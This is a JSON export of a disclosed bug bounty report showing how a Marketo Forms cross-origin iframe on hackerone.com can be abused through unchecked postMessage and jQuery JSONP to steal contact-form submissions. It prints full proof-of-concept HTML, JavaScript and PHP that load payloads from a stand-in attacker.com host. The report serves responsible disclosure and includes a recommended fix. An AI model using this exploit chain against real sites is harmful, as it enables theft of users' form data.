        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 57, 
        "name": "Violation of Secure Design Principles"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -37967478.94536618, 
    "disclosed_at": "2017-08-29T14:58:40.288Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/207042", 
    "created_at": "2017-02-17T04:18:23.540Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi,</p>\n\n<p>I just discovered that there&#39;s a scenario where the Marketo Forms solution being used on <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a> can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a>.</p>\n\n<p>What also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the <code>#contact</code>-fragment:</p>\n<pre class=\"highlight javascript\"><code> <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"sr\">/^#contact/</span><span class=\"p\">.</span><span class=\"nx\">test</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">hash</span><span class=\"p\">)</span> <span class=\"o\">===</span> <span class=\"kc\">true</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">LoadContactForm</span><span class=\"p\">();</span>\n <span class=\"p\">}</span>\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n\n<p>My PoC looks like this:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Marketo2.mp4\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/161/524/83a4181295e9a3b278da51a657f26637c5872b77/Marketo2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223332Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=76dfb2d5bf15e60b4695bb5addcf801b22b38e3cae1f194b8860e5c19af13d50\" data-attachment-type=\"video/mp4\"><video controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/161/524/83a4181295e9a3b278da51a657f26637c5872b77/Marketo2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223332Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=76dfb2d5bf15e60b4695bb5addcf801b22b38e3cae1f194b8860e5c19af13d50\" class=\"markdown-inline-image\"></video></a></p>\n\n<p>PoC-link is here, it will popup alert when form is submitted with the data:<br>\nhttps://\u2588\u2588\u2588\u2588\u2588/marketo2.html </p>\n\n<p>Only an annoying alert: <br>\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/marketo.html</p>\n\n<h3 id=\"technical-details\">Technical details</h3>\n\n<p>So, let&#39;s dig down what actually happens here.</p>\n\n<h4 id=\"marketo-cross-domain-ajax-request-window\">Marketo cross domain AJAX request window</h4>\n\n<p>Marketo uses an iframe that is located here (the <code>sj17</code> is just a specific instance on Marketo, this one differs between customers):</p>\n\n<p><a title=\"https://app-sj17.marketo.com/index.php/form/XDFrame\" href=\"/redirect?signature=8f16dc3687547b8d71deba1a0b941fe79909f32f&amp;url=https%3A%2F%2Fapp-sj17.marketo.com%2Findex.php%2Fform%2FXDFrame\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://app-sj17.marketo.com/index.php/form/XDFrame</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>This page contains a <code>postMessage</code>-listener to launch an ajax-call:</p>\n<pre class=\"highlight javascript\"><code><span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">parent</span> <span class=\"o\">||</span> <span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">parent</span> <span class=\"o\">==</span> <span class=\"nb\">window</span><span class=\"p\">){</span>\n  <span class=\"k\">return</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"nb\">window</span><span class=\"p\">).</span><span class=\"nx\">on</span><span class=\"p\">(</span><span class=\"s2\">&quot;message&quot;</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">e</span><span class=\"p\">){</span>\n  <span class=\"p\">...</span>\n  <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nx\">message</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">message</span><span class=\"p\">.</span><span class=\"nx\">mktoRequest</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">message</span><span class=\"p\">.</span><span class=\"nx\">mktoRequest</span><span class=\"p\">.</span><span class=\"nx\">ajaxParams</span><span class=\"p\">){</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">params</span> <span class=\"o\">=</span> <span class=\"nx\">message</span><span class=\"p\">.</span><span class=\"nx\">mktoRequest</span><span class=\"p\">.</span><span class=\"nx\">ajaxParams</span><span class=\"p\">;</span>\n    <span class=\"p\">...</span>\n    <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">ajax</span><span class=\"p\">(</span><span class=\"nx\">params</span><span class=\"p\">);</span>\n</code></pre>\n<p>First, as you see, the window will not work without any window parent. If it&#39;s framed, it&#39;ll start the listener. Passing arbitrary parameters to <code>$.ajax</code> is bad. Sending the following payload as the <code>ajaxParams</code>:</p>\n<pre class=\"highlight plaintext\"><code>{&quot;url&quot;:&quot;https://attacker.com/jsonp.php&quot;,&quot;dataType&quot;:&quot;jsonp&quot;,&quot;method&quot;:&quot;get&quot;}\n</code></pre>\n<p>Having the following content on the <code>jsonp.php</code>-endpoint:</p>\n<pre class=\"highlight plaintext\"><code>&lt;?\nheader(&quot;Access-Control-Allow-Origin: *&quot;);\n?&gt;\nalert(document.domain)\n</code></pre>\n<p>Will result in an XSS on this marketo.com-domain.</p>\n\n<h4 id=\"postmessage-passing\">postMessage passing</h4>\n\n<p>Since no origins are being used here, we can just pass any messages we like, from wherever we like.</p>\n\n<p>To abuse this on <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a> we need to do the following:</p>\n\n<ol>\n<li>Create our springboard page which will have an iframe of the <code>XDFrame</code> for Marketo:</li>\n</ol>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;iframe</span> <span class=\"na\">id=</span><span class=\"s\">&quot;x&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;x&quot;</span> <span class=\"na\">border=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">frameborder=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;100&quot;</span> <span class=\"na\">height=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">src=</span><span class=\"s\">&quot;https://app-sj17.marketo.com/index.php/form/XDFrame&quot;</span><span class=\"nt\">&gt;&lt;/iframe&gt;</span>\n</code></pre>\n<ol>\n<li>We listen to the message we get from the iframe to trigger our payload and we send back a <code>postMessage</code> loading a JSONP-endpoint with a function to create a link to <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a> with the <code>#contact</code> fragment:</li>\n</ol>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;script&gt;</span>\n<span class=\"kd\">var</span> <span class=\"nx\">run</span> <span class=\"o\">=</span> <span class=\"kc\">false</span>\n<span class=\"kd\">var</span> <span class=\"nx\">b</span>\n<span class=\"nb\">window</span><span class=\"p\">.</span><span class=\"nx\">onmessage</span><span class=\"o\">=</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n    <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">run</span><span class=\"p\">)</span>\n    <span class=\"nx\">x</span><span class=\"p\">.</span><span class=\"nx\">postMessage</span><span class=\"p\">(</span><span class=\"s1\">&#39;{&quot;mktoRequest&quot;:{&quot;ajaxParams&quot;:{&quot;url&quot;:&quot;https://attacker.com/jsonp.php&quot;,&quot;dataType&quot;:&quot;jsonp&quot;,&quot;method&quot;:&quot;get&quot;}}}&#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;*&#39;</span><span class=\"p\">)</span>\n    <span class=\"nx\">run</span> <span class=\"o\">=</span> <span class=\"kc\">true</span>\n<span class=\"p\">}</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n</code></pre>\n<p>This is the content of <code>jsonp.php</code>:</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?</span>\n<span class=\"nb\">header</span><span class=\"p\">(</span><span class=\"s2\">&quot;Access-Control-Allow-Origin: *&quot;</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span>\n(function(){\ndocument.body.innerHTML=&#39;<span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&quot;#&quot;</span> <span class=\"na\">onclick=</span><span class=\"s\">&quot;window.b=window.open(\\&#39;https://www.hackerone.com/product/overview#contact\\&#39;,\\&#39;b\\&#39;,\\&#39;\\&#39;)&quot;</span><span class=\"nt\">&gt;</span>Click me!<span class=\"nt\">&lt;/a&gt;</span>&#39;\n\nsetInterval(function() {\ntry {\n    b[&#39;frames&#39;][0].postMessage(&#39;{&quot;mktoRequest&quot;:{&quot;ajaxParams&quot;:{&quot;url&quot;:&quot;https://attacker.com/jsonp2.php&quot;,&quot;dataType&quot;:&quot;jsonp&quot;,&quot;method&quot;:&quot;get&quot;}}}&#39;, &#39;*&#39;)\n} catch(e){}\n}, 1000);\n})()\n</code></pre>\n<p>When victim clicks the link, we start a interval of <code>postMessage</code>-sending to <code>b[&#39;frames&#39;][0]</code> which should be the Marketo iframe on <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a>. Interesting enough, Marketo actually sets the name of the frame to <code>mktoFormsXDIframe + Math.random()</code> but this can be completely bypassed using <code>window[&#39;frames&#39;][0]</code> instead.</p>\n\n<p>Our code in <code>jsonp2.php</code> looks like this:</p>\n<pre class=\"highlight php\"><code><span class=\"cp\">&lt;?</span>\n<span class=\"nb\">header</span><span class=\"p\">(</span><span class=\"s2\">&quot;Access-Control-Allow-Origin: *&quot;</span><span class=\"p\">);</span>\n<span class=\"cp\">?&gt;</span>\n(function(){\n    if(window.icanhazmsg) return\n    window.icanhazmsg=true\n    window.onmessage=function(a) {\n        if(a.origin.indexOf(&#39;marketo&#39;) !== -1) return;\n        console.log(a);\n        alert(&quot;I HAVE YOUR DATA NOW\\n&quot; + a.data)\n    }\n})()\n</code></pre>\n<p>As you see, we now use the XSS passed from our springboard-iframe to the iframe on <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a> to register a listener to pop an alert when data is submitted in the form.</p>\n\n<p>Getting the victim to submit the form, will result in the infamous popup:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-02-17_at_05.07.40.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/161/523/ca85724b4b8f55fb5d57daecb86fb41fc32894ff/Screen_Shot_2017-02-17_at_05.07.40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223332Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=2406628809d7838cb0fd8eae2001134ae623a56777eff13de824bcf9a59a4ac2\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/161/523/ca85724b4b8f55fb5d57daecb86fb41fc32894ff/Screen_Shot_2017-02-17_at_05.07.40.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223332Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=2406628809d7838cb0fd8eae2001134ae623a56777eff13de824bcf9a59a4ac2\" class=\"markdown-inline-image\"></a></p>\n\n<p>So, what we did was the following:</p>\n\n<ol>\n<li>Attacker&#39;s page -&gt; Marketo iframe</li>\n<li>postMessage from Marketo iframe -&gt; Attacker&#39;s page</li>\n<li>Attacker&#39;s page -&gt; postMessage loading JSONP -&gt; Marketo iframe</li>\n<li>Create link on Marketo iframe -&gt; start sending postMessage</li>\n<li>Link opens <a href=\"/redirect?signature=5d6566533d7b4f3feaea01437f23f8e72a3f4836&amp;url=http%3A%2F%2Fwww.hackerone.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.hackerone.com</span><i class=\"icon-external-link\"></i></a> in new tab, triggers contact form to show using <code>#contact</code>\n</li>\n<li>Sends over postMessage from opener. XSS register listener in Marketo iframe</li>\n<li>Victim submits form, XSS reads data</li>\n</ol>\n\n<h3 id=\"conclusion\">Conclusion</h3>\n\n<p>I played around a bit with this issue and came to the following conclusion:</p>\n\n<ol>\n<li>Marketo Forms doesn&#39;t use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.</li>\n<li>Marketo Forms allows a bit too much flexibility for the page sending the postMessage. It&#39;s actually just throwing in a complete object called <code>ajaxParams</code> directly into <code>$.ajax()</code>. This results in the XSS on <code>app-*.marketo.com</code>. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the <code>jsonp</code>-mode of jQuery.</li>\n<li>In HackerOne&#39;s case, no data is handled sent from the <code>error</code> and <code>success</code> functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.</li>\n</ol>\n\n<p>Regards,<br>\nFrans</p>\n", 
    "vulnerability_information": "Hi,\n\nI just discovered that there's a scenario where the Marketo Forms solution being used on www.hackerone.com can actually be abused, using a few fun techniques, to trigger an XSS in the Cross-Origin-iframe being used by Marketo. This results in eavesdropping of the data being sent in the contact-form on www.hackerone.com.\n\nWhat also made this nice on HackerOne was the auto-trigger to launch the contact form without any interaction using the `#contact`-fragment:\n\n```js\n if(/^#contact/.test(window.location.hash) === true) {\n    LoadContactForm();\n }\n```\n\n### PoC\n\nMy PoC looks like this:\n\n{F161524}\n\nPoC-link is here, it will popup alert when form is submitted with the data:\nhttps://\u2588\u2588\u2588\u2588\u2588/marketo2.html \n\nOnly an annoying alert: \nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/marketo.html\n\n### Technical details\n\nSo, let's dig down what actually happens here.\n\n#### Marketo cross domain AJAX request window\n\nMarketo uses an iframe that is located here (the `sj17` is just a specific instance on Marketo, this one differs between customers):\n\nhttps://app-sj17.marketo.com/index.php/form/XDFrame\n\nThis page contains a `postMessage`-listener to launch an ajax-call:\n\n```js\nif(!window.parent || window.parent == window){\n  return;\n}\n$(window).on(\"message\", function (e){\n  ...\n  if(message && message.mktoRequest && message.mktoRequest.ajaxParams){\n    var params = message.mktoRequest.ajaxParams;\n    ...\n    $.ajax(params);\n```\n\nFirst, as you see, the window will not work without any window parent. If it's framed, it'll start the listener. Passing arbitrary parameters to `$.ajax` is bad. Sending the following payload as the `ajaxParams`:\n\n```\n{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}\n```\n\nHaving the following content on the `jsonp.php`-endpoint:\n\n```\n<?\nheader(\"Access-Control-Allow-Origin: *\");\n?>\nalert(document.domain)\n```\n\nWill result in an XSS on this marketo.com-domain.\n\n#### postMessage passing\n\nSince no origins are being used here, we can just pass any messages we like, from wherever we like.\n\nTo abuse this on www.hackerone.com we need to do the following:\n\n1. Create our springboard page which will have an iframe of the `XDFrame` for Marketo:\n\n```html\n<iframe id=\"x\" name=\"x\" border=\"0\" frameborder=\"0\" width=\"100\" height=\"30\" src=\"https://app-sj17.marketo.com/index.php/form/XDFrame\"></iframe>\n```\n\n2. We listen to the message we get from the iframe to trigger our payload and we send back a `postMessage` loading a JSONP-endpoint with a function to create a link to www.hackerone.com with the `#contact` fragment:\n\n```html\n<script>\nvar run = false\nvar b\nwindow.onmessage=function() {\n\tif(!run)\n\tx.postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n\trun = true\n}\n</script>\n```\n\nThis is the content of `jsonp.php`:\n\n```php\n<?\nheader(\"Access-Control-Allow-Origin: *\");\n?>\n(function(){\ndocument.body.innerHTML='<a href=\"#\" onclick=\"window.b=window.open(\\'https://www.hackerone.com/product/overview#contact\\',\\'b\\',\\'\\')\">Click me!</a>'\n\nsetInterval(function() {\ntry {\n\tb['frames'][0].postMessage('{\"mktoRequest\":{\"ajaxParams\":{\"url\":\"https://attacker.com/jsonp2.php\",\"dataType\":\"jsonp\",\"method\":\"get\"}}}', '*')\n} catch(e){}\n}, 1000);\n})()\n```\n\nWhen victim clicks the link, we start a interval of `postMessage`-sending to `b['frames'][0]` which should be the Marketo iframe on www.hackerone.com. Interesting enough, Marketo actually sets the name of the frame to `mktoFormsXDIframe + Math.random()` but this can be completely bypassed using `window['frames'][0]` instead.\n\nOur code in `jsonp2.php` looks like this:\n\n```php\n<?\nheader(\"Access-Control-Allow-Origin: *\");\n?>\n(function(){\n\tif(window.icanhazmsg) return\n\twindow.icanhazmsg=true\n\twindow.onmessage=function(a) {\n\t\tif(a.origin.indexOf('marketo') !== -1) return;\n\t\tconsole.log(a);\n\t\talert(\"I HAVE YOUR DATA NOW\\n\" + a.data)\n\t}\n})()\n```\n\nAs you see, we now use the XSS passed from our springboard-iframe to the iframe on www.hackerone.com to register a listener to pop an alert when data is submitted in the form.\n\nGetting the victim to submit the form, will result in the infamous popup:\n\n{F161523}\n\nSo, what we did was the following:\n\n1. Attacker's page -> Marketo iframe\n2. postMessage from Marketo iframe -> Attacker's page\n3. Attacker's page -> postMessage loading JSONP -> Marketo iframe\n4. Create link on Marketo iframe -> start sending postMessage\n5. Link opens www.hackerone.com in new tab, triggers contact form to show using `#contact`\n6. Sends over postMessage from opener. XSS register listener in Marketo iframe\n7. Victim submits form, XSS reads data\n  \n\n### Conclusion\n\nI played around a bit with this issue and came to the following conclusion:\n\n1. Marketo Forms doesn't use any origin-checks of the postMessage sent to their Cross Origin Frame. This is most likely because the whole point with the frame is to communicate with any page that uses Marketo. This is probably per design.\n2. Marketo Forms allows a bit too much flexibility for the page sending the postMessage. It's actually just throwing in a complete object called `ajaxParams` directly into `$.ajax()`. This results in the XSS on `app-*.marketo.com`. I think this is the best thing to patch up properly, not allowing full control over these params, especially not the `jsonp`-mode of jQuery.\n3. In HackerOne's case, no data is handled sent from the `error` and `success` functions being triggered when the form is posted which most likely saves HackerOne from getting a proper XSS on their own domain. However, since the data submitted in the form is still passed through the iframe, data can still be stolen using this technique.\n\nRegards,\nFrans", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://hackerone.com", 
            "about": "Vulnerability disclosure should be safe, transparent, and rewarding.", 
            "twitter_handle": "Hacker0x01", 
            "name": "HackerOne"
        }, 
        "handle": "security", 
        "url": "https://hackerone.com/security", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 13, 
        "default_currency": "usd"
    }, 
    "is_published": false
}